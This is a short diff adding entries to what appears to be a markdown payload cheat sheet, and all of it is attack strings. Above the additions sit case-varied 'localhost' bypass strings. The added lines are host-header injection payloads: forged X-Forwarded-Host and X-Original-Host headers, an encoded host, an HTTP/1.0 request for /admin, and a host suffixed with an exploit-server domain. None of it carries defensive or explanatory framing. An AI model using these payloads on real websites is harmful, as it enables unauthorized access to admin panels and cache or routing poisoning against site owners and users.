@@ -69,3 +69,33 @@ LocalHost
 lOcAlhOsT
 LOcalHOSt
 ```
+
+```
+Host: target.com
+X-Forwarded-Host: admin.target.com
+```
+
+```
+Host: admin.target.com
+```
+
+```
+Host: target.com:80
+```
+
+```
+GET /admin HTTP/1.0
+```
+
+```
+Host: target.com
+X-Original-Host: admin.target.com
+```
+
+```
+Host: admin%2etarget.com
+```
+
+```
+Host: target.com.exploit-server.com
+```
